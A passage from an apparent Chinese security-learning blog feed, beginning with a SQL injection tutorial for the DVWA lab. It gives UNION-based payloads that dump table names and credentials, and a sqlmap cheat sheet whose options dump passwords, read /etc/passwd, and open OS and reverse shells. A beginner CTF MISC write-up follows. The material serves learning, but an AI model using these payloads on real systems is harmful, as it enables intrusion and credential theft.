title="数字型注入"></a>数字型注入</h2><p>1、<code>?id=1&#39;</code>  加单引号输出错误<br>2、<code>?id=1 and 1=1</code> 输出正常<br>3、<code>?id=1 and 1=2</code> 输出错误<br>则存在数字型注入漏洞(或直接通过id=3-1和id=2的回显页面一致，判断这里存在数字型注入)</p><p>4、然后通过联合查询，查询到本数据库的其他所有表名<br><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>table_name字段是information_schema库中tables表的表名字段，表中还有数据库名字段table_schema。database()函数返回的内容是当前数据库的名称。group_contact是用<code>，</code>联合多行记录的函数，也就是说该语句可以联合查询当前库的所有（事实上有一定长度限制）表名并显示在一个字段中。</p><p>5、通过columns表及其中的column_name查询出的内容即为wp_user（上一步查询出的一个表名）中的字段名<br><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><h2 id="字符型注入流程"><a href="#字符型注入流程" class="headerlink" title="字符型注入流程"></a>字符型注入流程</h2><p>1、判断是否存在注入点<br>先输入一个单引号，看页面是否错误输出，如果错误输出，继续进行下一步(或者 id=3-1观察页面是否为空再<br>id=2a观察页面是否有结果，如果有，那么多半就是字符型)</p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><p>尝试使用单引号来闭合前面的单引号，再用<code>--%20</code>或<code>%23</code>注释后面的语句。这里一定要用<strong>url编码，空格的编码是%20,   #的编码是%23<br>id=2%27%23</strong><br><code>where id=&#39;1&#39;#&#39; </code>  此时的MySQL语句</p><p>2、判断数据库列数  order by [column_num]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><p>3、联合查询其他信息  union select [sql1] [sql2]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><p>4、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><p>5、联合查询信息  union [query_sql]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="关于Union联合注入的问题"><a href="#关于Union联合注入的问题" class="headerlink" title="关于Union联合注入的问题"></a>关于Union联合注入的问题</h2><p><code>? id=1 union select user,pwd from wp_user;</code><br>可能MySQL确实查询出了两行记录，但是PHP代码决定了页面只显示一行代码</p><p>可以在原有数据后面加上<code>limit 1,1</code> （是一个条件限制，作用是取查询结果第一条记录后的一条记录）<br><code>? id=1 union select user,pwd from wp_user limit 1,1;</code> </p><p>也可以指定id=-1或者一个很大的值，使得第一行记录无法被查到，这样结果就只有UNION的查询结果了</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p><img class="url&#x3D;&#x2F;picture&#x2F;web1.png"><p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#摘自冰河博客</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--current-user</span> <span class="hljs-comment">#获取当前用户名称</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--current-db</span> <span class="hljs-comment">#获取当前数据库名称</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--tables</span> -D <span class="hljs-string">&quot;db_name&quot;</span> <span class="hljs-comment">#列表名</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--columns</span> -T <span class="hljs-string">&quot;tablename&quot;</span> users-D <span class="hljs-string">&quot;db_name&quot;</span> -v 0 <span class="hljs-comment">#列字段</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump</span> -C <span class="hljs-string">&quot;column_name&quot;</span> -T <span class="hljs-string">&quot;table_name&quot;</span> -D <span class="hljs-string">&quot;db_name&quot;</span> -v 0 <span class="hljs-comment">#获取字段内容</span><br>******************信息获取****************** <br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--smart</span> <span class="hljs-params">--level</span> 3 <span class="hljs-params">--users</span> <span class="hljs-comment"># smart 智能 level 执行测试等级</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbms</span> <span class="hljs-string">&quot;Mysql&quot;</span> <span class="hljs-params">--users</span> <span class="hljs-comment"># dbms 指定数据库类型</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--users</span> <span class="hljs-comment">#列数据库用户</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbs</span><span class="hljs-comment">#列数据库</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--passwords</span> <span class="hljs-comment">#数据库用户密码</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--passwords-U</span> root -v 0 <span class="hljs-comment">#列出指定用户数据库密码</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump</span> -C <span class="hljs-string">&quot;password,user,id&quot;</span> -T <span class="hljs-string">&quot;tablename&quot;</span> -D <span class="hljs-string">&quot;db_name&quot;</span> <span class="hljs-params">--start</span> 1 <span class="hljs-params">--stop</span> 20 <span class="hljs-comment">#列出指定字段，列出 20 条</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump-all</span> -v 0 <span class="hljs-comment">#列出所有数据库所有表</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--privileges</span> <span class="hljs-comment">#查看权限</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--privileges</span> -U root <span class="hljs-comment">#查看指定用户权限</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--is-dba</span> -v 1 <span class="hljs-comment">#是否是数据库管理员</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--roles</span> <span class="hljs-comment">#枚举数据库用户角色</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--udf-inject</span> <span class="hljs-comment">#导入用户自定义函数（获取系统权限！）</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dump-all</span> <span class="hljs-params">--exclude-sysdbs</span> -v 0 <span class="hljs-comment">#列出当前库所有表</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--union-cols</span> <span class="hljs-comment">#union 查询表记录</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">&quot;COOKIE_VALUE&quot;</span> <span class="hljs-comment">#cookie 注入</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> -b <span class="hljs-comment">#获取 banner 信息</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;id=3&quot;</span> <span class="hljs-comment">#post 注入</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> -v 1 -f <span class="hljs-comment">#指纹判别数据库类型</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--proxy</span><span class="hljs-string">&quot;http://127.0.0.1:8118&quot;</span> <span class="hljs-comment">#代理注入</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span><span class="hljs-params">--string</span><span class="hljs-string">&quot;STRING_ON_TRUE_PAGE&quot;</span> <span class="hljs-comment">#指定关键词</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--sql-shell</span> <span class="hljs-comment">#执行指定 sql 命令</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--file</span> <span class="hljs-string">/etc/passwd</span>  <span class="hljs-comment">#必须为dbs权限</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--file-write</span> 本地文件路径 file-dest 目标路径  <span class="hljs-comment">#必须为dbs权限(可将本地的某个文件写入到目标路径下)</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--os-cmd=whoami</span> <span class="hljs-comment">#执行系统命令</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--os-shell</span> <span class="hljs-comment">#系统交互 shell</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--os-pwn</span> <span class="hljs-comment">#反弹 shell</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--reg-read</span> <span class="hljs-comment">#读取 win 系统注册表</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbs-o</span> <span class="hljs-string">&quot;sqlmap.log&quot;</span> <span class="hljs-comment">#保存进度</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--dbs</span> -o <span class="hljs-string">&quot;sqlmap.log&quot;</span> <span class="hljs-params">--resume</span> <span class="hljs-comment">#恢复已保存进度</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--msf-path=/opt/metasploit3/msf2</span> <span class="hljs-params">--os-pwn</span> 反弹 shell 需 metasploit 路径<br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--tamper</span> <span class="hljs-string">&quot;base64encode.py&quot;</span> 加载脚本<span class="hljs-params">(可利用绕过注入限制)</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--tamper</span> <span class="hljs-string">&quot;base64encode.py&quot;</span> 加载脚本<span class="hljs-params">(可利用绕过注入限制)</span><br>sqlmap -g <span class="hljs-string">&quot;google 语法&quot;</span> <span class="hljs-params">--dump-all</span> <span class="hljs-params">--batch</span> <span class="hljs-comment">#google 搜索注入点自动 跑出所有字段</span><br>sqlmap.py -u <span class="hljs-string">&quot;http://192.168.109.139/news?id=1&quot;</span> <span class="hljs-params">--forms</span>  <span class="hljs-comment">#post提交方式注入</span><br>sqlmap.py -r 本地数据包路径 <span class="hljs-comment">#post提交方式注入</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是有点乱，有时间会把弄好的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入&lt;/p&gt;
&lt;p&gt;浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>sql注入和sqlmap的使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-17T14:25:01.000Z</published>
    <updated>2022-03-23T14:17:59.378Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>还是有点乱，有时间会把弄好的</p></blockquote><p>常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</p><p>浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后会自动进行URL解码</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p><code>SELECT username, password FROM users WHERE username=&#39;&#39; or 1=1 -- AND password=&#39;anything</code><br>用户的输入用户名为<code>&#39; or 1=1 --</code>，密码为任意值即可</p><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p><img src="/picture/web19.png"></p><p>1、查看数据库名<br><code>select schema_name from information_schema.schemata;</code></p><p>2、查看表名<br><code>select table_name from information_schema.tables where table_schema=&#39;security&#39;;</code><br>这个security是上一步查出来的数据库名称</p><p>3、查看列名<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;;</code><br>users是上一步查出来的表名</p><p>4、查数据<br><code>select username,password from security.users;</code><br>username和password是一步查出来的列名</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>1、<code>?id=1&#39;</code>  加单引号输出错误<br>2、<code>?id=1 and 1=1</code> 输出正常<br>3、<code>?id=1 and 1=2</code> 输出错误<br>则存在数字型注入漏洞(或直接通过id=3-1和id=2的回显页面一致，判断这里存在数字型注入)</p><p>4、然后通过联合查询，查询到本数据库的其他所有表名<br><code>?id=-1 union select 1,group_concat(table_name) from information_schema,tables where table_schema=database()</code><br>table_name字段是information_schema库中tables表的表名字段，表中还有数据库名字段table_schema。database()函数返回的内容是当前数据库的名称。group_contact是用<code>，</code>联合多行记录的函数，也就是说该语句可以联合查询当前库的所有（事实上有一定长度限制）表名并显示在一个字段中。</p><p>5、通过columns表及其中的column_name查询出的内容即为wp_user（上一步查询出的一个表名）中的字段名<br><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><h2 id="字符型注入流程"><a href="#字符型注入流程" class="headerlink" title="字符型注入流程"></a>字符型注入流程</h2><p>1、判断是否存在注入点<br>先输入一个单引号，看页面是否错误输出，如果错误输出，继续进行下一步(或者 id=3-1观察页面是否为空再<br>id=2a观察页面是否有结果，如果有，那么多半就是字符型)</p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><p>尝试使用单引号来闭合前面的单引号，再用<code>--%20</code>或<code>%23</code>注释后面的语句。这里一定要用<strong>url编码，空格的编码是%20,   #的编码是%23<br>id=2%27%23</strong><br><code>where id=&#39;1&#39;#&#39; </code>  此时的MySQL语句</p><p>2、判断数据库列数  order by [column_num]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><p>3、联合查询其他信息  union select [sql1] [sql2]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><p>4、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><p>5、联合查询信息  union [query_sql]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="关于Union联合注入的问题"><a href="#关于Union联合注入的问题" class="headerlink" title="关于Union联合注入的问题"></a>关于Union联合注入的问题</h2><p><code>? id=1 union select user,pwd from wp_user;</code><br>可能MySQL确实查询出了两行记录，但是PHP代码决定了页面只显示一行代码</p><p>可以在原有数据后面加上<code>limit 1,1</code> （是一个条件限制，作用是取查询结果第一条记录后的一条记录）<br><code>? id=1 union select user,pwd from wp_user limit 1,1;</code> </p><p>也可以指定id=-1或者一个很大的值，使得第一行记录无法被查到，这样结果就只有UNION的查询结果了</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p><img class="url&#x3D;&#x2F;picture&#x2F;web1.png"><p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;还是有点乱，有时间会把弄好的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入&lt;/p&gt;
&lt;p&gt;浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>buu-MISC第一页</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/09/buu-MISC%E7%AC%AC%E4%B8%80%E9%A1%B5/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/09/buu-MISC%E7%AC%AC%E4%B8%80%E9%A1%B5/</id>
    <published>2022-03-09T06:25:48.000Z</published>
    <updated>2022-03-09T06:27:37.665Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>如果大家有任何问题，都可以随时问我，我也是刚入坑不久的小白，大家共同进步</p></blockquote><hr><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>拿到gif，放进stegsolve看frame<br><img src="https://img-blog.csdnimg.cn/5681e0c66b634af59718351f4255f1f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拼接得到flag</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫二维码得到<br><img src="https://img-blog.csdnimg.cn/e4eb648093874f7095892516ff5487d8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢进010editor<br><img src="https://img-blog.csdnimg.cn/46e05d92ef164ec79fcc1101a46ac7c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到zip，导出<img src="https://img-blog.csdnimg.cn/06590841b81141a38e4a230533ef6b71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>zip有密码，提示是4位，archpr爆破即可</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p><img src="https://img-blog.csdnimg.cn/ab0c6b14aedd403fa55de622d125f9d2.png" alt="在这里插入图片描述"><br>010editor文件尾看到flag</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>给了KEY.exe<br>双击打不开<br>丢进Exeinfo PE里面<br><img src="https://img-blog.csdnimg.cn/34787e1187454e879f4cdb5a1c46a286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>放进010editor<br><img src="https://img-blog.csdnimg.cn/7321e3ffa74540a888aa3153b3789574.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>base64转图片<br><img src="https://img-blog.csdnimg.cn/16f81778221d4d9591f1ed76213ae9c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>扫码得flag</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>题目提示屏幕太小了<br>改宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#crc爆破宽高的脚本</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br>crcbp=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2048</span>):<br>        data=crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>]+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>,j)+crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32=binascii.crc32(data)&amp;<span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc32== <span class="hljs-number">0x00BF122A</span>:  <span class="hljs-comment">#这里的值也需要根据图片的crc值进行更改</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-built_in">hex</span>(j))<br><br></code></pre></td></tr></table></figure><p>我这里直接尝试着改高度<br><img src="https://img-blog.csdnimg.cn/575d73ddb1d0487da6980c9fdb0ebfff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p> 改成2<br> <img src="https://img-blog.csdnimg.cn/3a0783b6664945d39e0e3317c54b33eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里给大家推荐一个工具quicker，直接OCR截图识别，还是很方便常用的</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>题目提示4位密码，archpr爆破的密码<br>得到ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=<br>base64解码得flag</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p><img src="https://img-blog.csdnimg.cn/46bb22b542ea48048695592509070fbe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>010editor打开，又在文件尾</p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>这题，我是真的菜<br>前面几题都有记得看exif，这题没有，没写出来，哈哈<br>答案在exif里面<br><img src="https://img-blog.csdnimg.cn/1b8e279c9a024c48816b144a05f22ee1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>一直在研究这串数字，觉得这串数字不太对劲<br>md5、十六进制转字符不对<br>想想是不是7位ASCII转换，发现也不太像<br>毫无头绪<br>没想到就是这串数字，套上flag</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>丢进wireshark<br>直接搜flag<br>tcp contains “flag”<br>追踪流<br><img src="https://img-blog.csdnimg.cn/93b79bcf426f402480e2b67787f66ee8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这次学聪明了，直接套上flag提交</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>那直接lsb<br><img 